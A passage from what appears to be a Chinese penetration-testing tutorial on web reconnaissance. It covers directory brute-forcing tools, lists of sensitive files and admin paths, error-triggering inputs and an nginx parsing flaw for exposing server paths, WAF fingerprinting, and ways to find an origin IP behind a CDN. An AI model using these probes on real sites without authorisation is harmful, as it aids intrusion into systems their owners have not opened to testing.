data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvY2MzZWIxODUtMjBiYy00YThlLTk2OTUtYTU4YzY1YjNiOGQ1PyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFpeTg0JUVGJUJDJTg5">https://www.yuque.com/docs/share/cc3eb185-20bc-4a8e-9695-a58c65b3b8d5?#（密码：iy84）</span> 《Nmap 常用命令》</p><h4 id="在线端口检测"><a class="markdownIt-Anchor" href="#在线端口检测">#</a> 在线端口检测</h4><p>地址：<span class="exturl" data-url="aHR0cDovL2Nvb2xhZi5jb20vdG9vbC9wb3J0">http://coolaf.com/tool/port</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628060066761-2a0a9b74-05ed-461a-8039-7cdb1826af4a.png" alt="img"></p><h2 id="目录类站点"><a class="markdownIt-Anchor" href="#目录类站点">#</a> 目录类站点</h2><h3 id="目录扫描"><a class="markdownIt-Anchor" href="#目录扫描">#</a> 目录扫描</h3><p>目的：</p><ul><li><ul><li>寻找网站的后台</li><li>寻找未授权页面</li></ul></li><li><ul><li>寻找网站更多隐藏信息</li></ul></li></ul><h4 id="常见敏感文件或目录"><a class="markdownIt-Anchor" href="#常见敏感文件或目录">#</a> 常见敏感文件或目录</h4><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">后台</span><br><span class="line">robots.txt</span><br><span class="line">数据库log</span><br><span class="line">sitemap.xml</span><br><span class="line">mysql.sql</span><br><span class="line">licence.txt</span><br><span class="line">Git</span><br><span class="line">hg/Mercurial</span><br><span class="line">svn/Subversion</span><br><span class="line">bzr/Bazaar</span><br><span class="line">Cvs</span><br><span class="line">WEB-INF泄露</span><br><span class="line">备份文件泄露、配置文件泄露</span><br></pre></td></tr></table></figure><h4 id="常用后台"><a class="markdownIt-Anchor" href="#常用后台">#</a> 常用后台</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin/ </span><br><span class="line">admin.后缀</span><br><span class="line">admin/login.后缀 </span><br><span class="line">manage </span><br><span class="line">webmanager</span><br><span class="line">等等</span><br></pre></td></tr></table></figure><h4 id="文件路径tips"><a class="markdownIt-Anchor" href="#文件路径tips">#</a> 文件路径 tips</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看网站图片，其中目录很可能包含管理目录，这里查看要躲在几个地方查看;</span><br><span class="line">1.首页</span><br><span class="line">2.新闻中心</span><br><span class="line">3.上传点</span><br><span class="line">就是查看的图片要有不同上传点上传的图片，如果图片保存路径在后台的下级目录，那么这种方法屡试不爽。</span><br></pre></td></tr></table></figure><h4 id="rototstxt"><a class="markdownIt-Anchor" href="#rototstxt">#</a> rotots.txt</h4><p>作用：</p><ul><li><ul><li>Robots 协议 “网络爬虫排除标准”，网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取；</li><li>同时也记录网站所具有的基本的目录；</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627465079912-c6d85864-f971-425e-8c8b-7f3ceea5b22b.png" alt="img"></p><h4 id="搜索引擎"><a class="markdownIt-Anchor" href="#搜索引擎">#</a> 搜索引擎</h4><p>搜索引擎会爬取网站下目录，并且不需要触碰网站任何防御设备；</p><p>语法：site:360.cn</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627465248183-fb04fe1a-927b-4bc1-9020-0326dd0e1f0a.png" alt="img"></p><h4 id="爆破枚举"><a class="markdownIt-Anchor" href="#爆破枚举">#</a> 爆破枚举</h4><p>原理：通过字典匹配网站是否返回响应正确状态码，然后列出存在的目录；</p><p>爆破可能会触发网站防火墙规则拦截，造成封禁 IP 现象；</p><p><strong>字典</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali默认字典：</span><br><span class="line">cd /usr/share/wordlists/</span><br><span class="line">  </span><br><span class="line">https://gitee.com/molok/Blasting_dictionary</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">https://github.com/fuzz-security/SuperWordlist</span><br></pre></td></tr></table></figure><p><strong>dirb</strong></p><p>kali 自带简易目录扫描工具</p><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">-a   //设置UA</span><br><span class="line">  -z   //设置毫秒延迟</span><br><span class="line">  -b   //不扫描../或者./</span><br><span class="line">  -c   //设置cookie</span><br><span class="line">  -E   //设置证书文件</span><br><span class="line">  -N   //忽略某些响应码</span><br><span class="line">  -X   //在每个测试目录上附加后缀</span><br><span class="line">  -o 文件名  //保存扫描文件</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">使用：</span><br><span class="line">  dirb http://www.baidu.com </span><br><span class="line">  dirb http://www.baidu.com /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><p><strong>DirBuster</strong></p><p>Kali Linux 提供的目录扫描工具 DirBuster 支持全部的 Web 目录扫描方式。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。该工具使用 Java 语言编写，提供命令行（Headless）和图形界面（GUI）两种模式。其中，图形界面模式功能更为强大。用户不仅可以指定纯暴力扫描的字符规则，还可以设置以 URL 模糊方式构建网页路径。同时，用户还对网页解析方式进行各种定制，提高网址解析效率；</p><p>启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">终端输入：dirbuster</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627470634103-8ea88074-133c-4de4-94bd-c36afe9682cc.png" alt="img"><br><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627470885474-91ef21c0-c6a6-4c0b-a79e-b280b210fc8b.png" alt="img"></p><p>如果你扫描的目标是 http://www.xxx.com/admin/，那么就要在 URL fuzz 里填写 &quot;/admin/{dir}&quot;, 意思是在 &quot;{dir}“的前后可以随意拼接你想要的目录或者后缀，例如输入”: /admin/{dir}.php&quot; 就表示扫描 admin 目录下的所有 php 文件</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627471028261-c72762d1-ec97-4424-810d-e65717179b2f.png" alt="img"></p><p><strong>Dirmap</strong></p><p>一个高级 web 目录扫描工具，功能将会强于 DirBuster、Dirsearch、cansina、御剑；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0g0Y2tGb3JKb2IvZGlybWFw">https://github.com/H4ckForJob/dirmap</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/H4ckForJob/dirmap.git</span><br><span class="line"></span><br><span class="line">python3 -m pip install -r requirement.txt</span><br><span class="line"></span><br><span class="line">//关于bruter.py第517行bar.log.start()出错。解决方案：安装progressbar2。卸载progressbar。防止导入同名模块。</span><br><span class="line"></span><br><span class="line">python3 -m pip uninstall progressbar</span><br><span class="line">python3 -m pip install progressbar2</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -i 192.168.1.1 -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -i 192.168.1.0/24 -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf</span><br><span class="line"></span><br><span class="line">python3 dirmap.py -iF targets.txt -lcf</span><br><span class="line"></span><br><span class="line">//结果将自动保存在项目根目录下的output文件夹中</span><br><span class="line">//每一个目标生成一个txt，命名格式为目标域名.txt</span><br><span class="line">//结果自动去重复，不用担心产生大量冗余</span><br></pre></td></tr></table></figure><p><strong>御剑</strong></p><p>国内第一目录扫描器，小白利器；</p><p>地址 **：**<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zvcnl1amlhbi95amRpcnNjYW4=">https://github.com/foryujian/yjdirscan</span></p><p><strong>7kbstorm</strong></p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzdrYnN0b3JtLzdrYnNjYW4tV2ViUGF0aEJydXRl">https://github.com/7kbstorm/7kbscan-WebPathBrute</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628060773788-d3395770-467d-4807-80e9-abe49b1a0afb.png" alt="img"></p><h3 id="物理路径"><a class="markdownIt-Anchor" href="#物理路径">#</a> 物理路径</h3><h4 id="报错"><a class="markdownIt-Anchor" href="#报错">#</a> 报错</h4><p>在处理报错信息的问题上如果处理不当，就可导致路径信息泄露，比如访问一些不存在的文件等思路；</p><p>报错方法很多，说不完的，具体还要根据实际情况操作；</p><p>比较实用的：</p><ul><li><p>有动态 URL 的地方可以替换参数 替换参数值为不存在的，很多时候都能爆物理路径；</p><p>访问不存在的文件名 文件 或者改正常后缀为不支持的后缀；</p></li><li><p>IIS7.0 以上，如果没有修改 404 页面，只要浏览 web 任意不存在的文件，都会直接暴出绝对路径；</p><p>同理，thinkphp 也有这个性质。 在 id=1 的注入点，使用各种不支持的字符，比如 id=1’ id=? id=-1 id=\ id=/ 都有可能暴出绝对路径；</p></li><li><p>还有的时候传一些错误图片会报错 windows 不支持的符号，?:&lt;&gt; 之类的，还有 windows 不支持的文件名 aux Windows 服务器上传 aux 文件或者新建 aux 文件夹，因为不允许这种文件存在而报错泄露绝对路径；</p></li><li><p>尤其是 php 框架写的站，上传很容易爆出物理路径，根据具体情况了，比如提交允许的后缀，整体提交时抓包改为不支持的后缀，放包，很多时候都能爆出物理路径。 有一部分都是 sql 语句报错，sql 很多时候会爆物理路径；</p></li></ul><h4 id="后台"><a class="markdownIt-Anchor" href="#后台">#</a> 后台</h4><p>可以登录后台的话，后台首页一般都有服务器信息的，大部分情况下物理路径都在里面；</p><h4 id="功能点"><a class="markdownIt-Anchor" href="#功能点">#</a> 功能点</h4><p>上传图片处 ：</p><p>第一点：在上传图片处，这里是最可能存在问题的点，就是关于上传相关证明，进行实名制上传信息等功能页面，在上传图片时进行抓包，然后查看返回包，那么就可看到当前服务器的绝对路径信息；</p><h4 id="容器特性"><a class="markdownIt-Anchor" href="#容器特性">#</a> 容器特性</h4><p>如：Apache Tomcat、Struts2、CMS、zabix、Nginx 等等，例如 Nginx 的某版本解析漏洞，就可造成路径信息泄露；</p><p>常见点：</p><ul><li><ul><li>IIS 大于 6 的版本，基本都是 导致他 404 就可以爆出物理路径、IIS 名、IIS 版本。这个很简单，随便访问个不存在的目录或文件就可以；</li><li>nginx 文件类型错误解析爆路径:</li></ul></li><li><ul><li><ul><li>说明：要求 Web 服务器是 nginx，且存在文件类型解析漏洞；</li><li>有时在图片地址后加 /x.php，该图片不但会被当作 php 文件执行，有可能爆出物理路径 <span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL3h4LmpwZy94LnBocCVFRiVCQyU5Qg==">www.xxx.com/xx.jpg/x.php；</span></li></ul></li></ul></li></ul><h4 id="文件泄露"><a class="markdownIt-Anchor" href="#文件泄露">#</a> 文件泄露</h4><p><strong>遗留文件 探针文件：</strong></p><p>通过遗留文件获得，比如：</p><ul><li><ul><li><ul><li>phpinfo.php</li><li>info.php</li></ul></li></ul></li><li><ul><li><ul><li>site.php</li><li>1.php</li></ul></li></ul></li><li><ul><li><ul><li>a.php</li></ul></li></ul></li></ul><p>一些探针文件啊都有，等等；</p><p>在遗留文件中搜索 SCRIPT_FILENAME；很多网站的根目录下都存在测试文件，脚本代码通常都是 phpinfo ()；</p><p>如：</p><ul><li><ul><li>test.php</li><li>ceshi.php</li></ul></li><li><ul><li>info.php</li><li>phpinfo.php</li></ul></li><li><ul><li>php_info.php</li><li>1.php</li></ul></li></ul><p><strong>phpmyadmin 爆路径：</strong></p><p>一旦找到 phpmyadmin 的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径；</p><p>至于 phpmyadmin 的地址可以用 wwwscan 这类的工具去扫，也可以选择 google；</p><p>常见路径：</p><ul><li><ul><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpMyAdmin/index.php?lang[]=1</li></ul></li><li><ul><li>/phpMyAdmin/phpinfo.php load_file()</li><li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li></ul></li><li><ul><li>/phpmyadmin/libraries/select_lang.lib.php</li><li>/phpmyadmin/libraries/lect_lang.lib.php</li></ul></li><li><ul><li>/phpmyadmin/libraries/mcrypt.lib.php</li></ul></li></ul><p><strong>配置文件找路径：</strong></p><p>如果注入点有文件读取权限，就可以手工 load_file 或工具读取配置文件，再从中寻找路径信息（一般在文件末尾），各平台下 Web 服务器和 PHP 的配置文件默认路径可以上网查；</p><p>常见配置文件：</p><ul><li><ul><li>c:\windows\php.ini php 配置文件</li><li>c:\windows\system32\inetsrv\MetaBase.xml    IIS 虚拟主机配置文件</li></ul></li><li><ul><li>C:\xampp\apache\conf\httpd.conf</li><li>/var/www/conf/httpd.conf</li></ul></li></ul><p>常见集成环境默认目录，后面往往还有以域名命名的目录：</p><ul><li><ul><li>C:\Inetpub\wwwroot</li><li>C:\xampp\htdocs</li></ul></li><li><ul><li>D: \phpStudy\WWW</li><li>/home/wwwroot/ /www/users/</li></ul></li></ul><h4 id="默认路径"><a class="markdownIt-Anchor" href="#默认路径">#</a> 默认路径</h4><p><strong>Linux:</strong></p><p>linux 还可以用瞎蒙大法；</p><ul><li><ul><li>/var/www/html/ 网站名</li><li>/etc/php.ini php 配置文件</li></ul></li><li><ul><li>/etc/httpd/conf.d/php.conf</li><li>/etc/httpd/conf/httpd.conf Apache 配置文件</li></ul></li><li><ul><li>/usr/local/apache/conf/httpd.conf</li><li>/usr/local/apache2/conf/httpd.conf</li></ul></li><li><ul><li>/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</li></ul></li></ul><h2 id="waf"><a class="markdownIt-Anchor" href="#waf">#</a> WAF</h2><p>WAF (web 应用防火墙)：是款专门针对 Web 应用攻击的防护产品；</p><h3 id="识别"><a class="markdownIt-Anchor" href="#识别">#</a> 识别：</h3><h4 id="简单sql语法看是否拦截"><a class="markdownIt-Anchor" href="#简单sql语法看是否拦截">#</a> 简单 sql 语法看是否拦截</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627472590901-8b8dac7c-e193-46ba-95d5-d5830521ad57.png" alt="img"></p><h4 id="nmap脚本识别waf"><a class="markdownIt-Anchor" href="#nmap脚本识别waf">#</a> nmap 脚本识别 waf</h4><p>经测试，不靠谱；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,443 --script=http-waf-detect 目标主机</span><br><span class="line">nmap -p 80,443 --script=http-waf-fingerprint 目标主机（精度更高）</span><br></pre></td></tr></table></figure><h4 id="wafw00f"><a class="markdownIt-Anchor" href="#wafw00f">#</a> wafw00f</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuYWJsZXNlY3VyaXR5L3dhZncwMGY=">https://github.com/enablesecurity/wafw00f</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">wafw00f www.baidu.com</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">python3 setup.py install</span><br><span class="line">  cd wafw00f</span><br><span class="line">  python3 main.py www.baidu.com</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627475131807-eab5a37b-6c75-4306-beb0-cf2d36a36882.png" alt="img"></p><h4 id="identywaf"><a class="markdownIt-Anchor" href="#identywaf">#</a> identYwaf</h4><p><strong>identYwaf</strong> 是一种识别工具，可以基于盲推理识别 Web 保护类型（即 WAF）;</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL2lkZW50eXdhZg==">https://github.com/stamparm/identywaf</span></p><p>语法：python3 <span class="exturl" data-url="aHR0cDovL2lkZW50WXdhZi5weQ==">identYwaf.py</span> ip/url</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627477001156-f671fd10-24f7-404a-a9fa-0fac40e20231.png" alt="img"></p><h4 id="看图识别"><a class="markdownIt-Anchor" href="#看图识别">#</a> 看图识别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</span><br></pre></td></tr></table></figure><h2 id="cdn"><a class="markdownIt-Anchor" href="#cdn">#</a> CDN</h2><h3 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2">#</a> 介绍</h3><p>CDN 的全称是 Content Delivery Network，即<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9wcm9kdWN0L2Nkbj9mcm9tPTEwNjgw">内容分发网络</span>，基本思路就是通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN 核心的就是使用户可就近访问网络，取得所需内容，解决网络拥挤的状况，提高用户访问网站的响应速度或者用户下载速度。一般来说，网站开启 CDN 之后，会根据用户所在地的不同访问 CDN 的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源，降低服务器压力，可以提升用户体验。这也就是大家都在 ping 百度，但是不同地区得到的反馈 ip 不一样的原因。其次，由于 CDN 节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN 其实是充当了一个替身的角色，无论服务器是渗透还是 DD0S 攻击，攻击的目标都将是 CDN 节点，这样一来便间接的保护了网站本身；</p><p>常见的有：Cloudflare、yunjiasu</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628066485551-dc8296fe-ee3b-494a-8ed2-3bdda175383f.png" alt="img"></p><h3 id="验证是否存在cdn"><a class="markdownIt-Anchor" href="#验证是否存在cdn">#</a> 验证是否存在 CDN</h3><h4 id="ping"><a class="markdownIt-Anchor" href="#ping">#</a> ping</h4><p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一，多半是使用了 CDN；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">国内在线：</span><br><span class="line">CDN云观测：http://cdn.chinaz.com/</span><br><span class="line">    超级ping：http://ping.chinaz.com/</span><br><span class="line">爱站：https://ping.aizhan.com/</span><br><span class="line">    17ce：https://www.17ce.com/</span><br><span class="line"></span><br><span class="line">国外在线：</span><br><span class="line">cdnplanet：https://www.cdnplanet.com/tools/cdnfinder/</span><br><span class="line">    站长工具：http://tool.chinaz.com/speedworld/</span><br><span class="line">    ping：http://www.ping.pe/</span><br><span class="line"></span><br><span class="line">全球：</span><br><span class="line">ipip：https://tools.ipip.net/httphead.php</span><br><span class="line">    wepcc：https://www.wepcc.com/</span><br></pre></td></tr></table></figure><h4 id="nslookup"><a class="markdownIt-Anchor" href="#nslookup">#</a> nslookup</h4><p>使用 nslookup 进行检测，原理同 ping，如果返回域名解析对应多个 IP 地址多半是使用了 CDN；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> 绕过</h3><h4 id="查询历史dns记录"><a class="markdownIt-Anchor" href="#查询历史dns记录">#</a> 查询历史 DNS 记录</h4><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/                                        ###DNS查询</span><br><span class="line">https://x.threatbook.cn/                                       ###微步在线</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=         ###在线域名信息查询</span><br><span class="line">http://viewdns.info/                                              ###DNS、IP等查询</span><br><span class="line">https://tools.ipip.net/cdn.php                               ###CDN查询IP</span><br></pre></td></tr></table></figure><h4 id="securitytrails平台"><a class="markdownIt-Anchor" href="#securitytrails平台">#</a> SecurityTrails 平台</h4><p>只需在搜索字段中输入网站域名，然后按 Enter 键即可，这时 “历史数据” 就可以在左侧的菜单中找到。SecurityTrails 平台除了过去的 DNS 记录，即使是当前的记录也可能泄漏原始服务器 IP。例如，MX 记录是一种常见的查找 IP 的方式。如果网站在与 web 相同的服务器和 IP 上托管自己的邮件服务器，那么原始服务器 IP 将在 MX 记录中；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20v">https://securitytrails.com/</span></p><h4 id="在线网站获取"><a class="markdownIt-Anchor" href="#在线网站获取">#</a> 在线网站获取</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://get-site-ip.com/</span><br></pre></td></tr></table></figure><h4 id="查询子域名"><a class="markdownIt-Anchor" href="#查询子域名">#</a> 查询子域名</h4><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个 C 段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实 IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/ </span><br><span class="line"></span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line"></span><br><span class="line">https://securitytrails.com/list/keyword</span><br><span class="line"></span><br><span class="line">https://tool.chinaz.com/subdomain/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google 搜索；例如：用语法&quot;site:baidu.com -www&quot;就能查看除www外的子域名。</span><br><span class="line"></span><br><span class="line">子域名扫描器,前面有介绍。</span><br></pre></td></tr></table></figure><p>找到子域名继续确认子域名没有 cdn 的情况下批量进行域名解析查询，有 cdn 的情况继续查询历史；</p><p>域名批量解析：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vZG9tYWluMmlwLmh0bWw=">http://tools.bugscaner.com/domain2ip.html</span></li></ul></li></ul><h4 id="网络空间搜索引擎"><a class="markdownIt-Anchor" href="#网络空间搜索引擎">#</a> 网络空间搜索引擎</h4><p>最常见的网络空间搜索引擎有钟馗之眼、shodan、fofa；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FOFA：https://fofa.so/</span><br><span class="line">title=&quot;网站的title关键字&quot;</span><br><span class="line">    body=&quot;网站的body特征&quot;</span><br><span class="line">    domain=&quot;t00ls.net&quot;</span><br><span class="line">    302一般都是cdn</span><br><span class="line"></span><br><span class="line">钟馗之眼：https://www.zoomeye.org/ </span><br><span class="line"></span><br><span class="line">Shodan：https://www.shodan.io/</span><br></pre></td></tr></table></figure><p>利用网站返回的内容寻找真实原始 IP，如果原始服务器 IP 也返回了网站的内容，那么可以在网上搜索大量的相关数据；</p><h4 id="ico图标通过空间搜索找真实ip"><a class="markdownIt-Anchor" href="#ico图标通过空间搜索找真实ip">#</a> ico 图标通过空间搜索找真实 ip</h4><p><span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L2Zhdmljb24uaWNv">https://www.t00ls.net/favicon.ico</span> 下载图标 放到 fofa 识别</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628066824103-9b28b548-27d0-46f3-a1ce-fc9da5628e18.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628066832762-8feb2cc5-1852-4bf5-8ff2-5aa1c4fed666.png" alt="img"></p><h4 id="利用ssl证书寻找真实原始ip"><a class="markdownIt-Anchor" href="#利用ssl证书寻找真实原始ip">#</a> 利用 SSL 证书寻找真实原始 IP</h4><p>假如你在 xyz123boot.com 上托管了一个服务，原始服务器 IP 是 136.23.63.44。 而 CloudFlare 则会为你提供 DDoS 保护，Web 应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的 Web 服务器就必须支持 SSL 并具有证书；</p><p>此时 CloudFlare 与你的服务器之间的通信，就像你和 CloudFlare 之间的通信一样，会被加密（即没有灵活的 SSL 存在）。这看起来很安全，但问题是，当你在端口 443（<span class="exturl" data-url="aHR0cHM6Ly8xMzYuMjMuNjMuNDQ6NDQz">https://136.23.63.44:443</span>）上直接连接到 IP 时，SSL 证书就会被暴露；</p><p>Censys 工具就能实现对整个互联网的扫描，Censys 是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。Censys 搜索引擎能够扫描整个互联网，Censys 每天都会扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告，若目标站点有 https 证书，并且默认虚拟主机配了 https 证书，我们就可以找所有目标站点是该 https 证书的站点；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9jZW5zeXMuaW8vaXB2NA==">https://censys.io/ipv4</span></p><p>攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数；</p><p>baidu.com 查询的参数是：parsed.names:baidu.com</p><p>只显示有效证书的查询参数为：tags.raw:trusted</p><p>攻击者可以在 Censys 上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成；</p><p>组合后的参数：parsed.names:baidu.com and tags.raw:trusted</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627480155571-53011bf6-eed0-4576-aa67-7d9541d5cec7.png" alt="img"></p><p>Censys 将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的；</p><p>要逐个查看这些搜索结果，我们可以通过单击右侧的 “Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627480540255-32c74593-f859-437a-b2a7-2f5059fcdf22.png" alt="img"></p><p>此时，我们将看到一个使用特定证书的 IPv4 主机列表，而真实原始 IP 就藏在其中；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627480768820-46c65e3b-d3d3-478d-b2ac-d77c5f8d4408.png" alt="img"></p><p>我们可以通过导航到端口 443 上的 IP 来验证，<span class="exturl" data-url="aHR0cDovL3huLS1iYWlkdS02bzZoZzZpMWVvMjlkdmdhcTcxaXpqNmJueTdkLmNvbQ==">看它是否重定向到 baidu.com</span> 或它是否直接在 IP 上显示网站；</p><h4 id="使用国外主机解析域名"><a class="markdownIt-Anchor" href="#使用国外主机解析域名">#</a> 使用国外主机解析域名</h4><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实 IP</p><h4 id="网站漏洞查找"><a 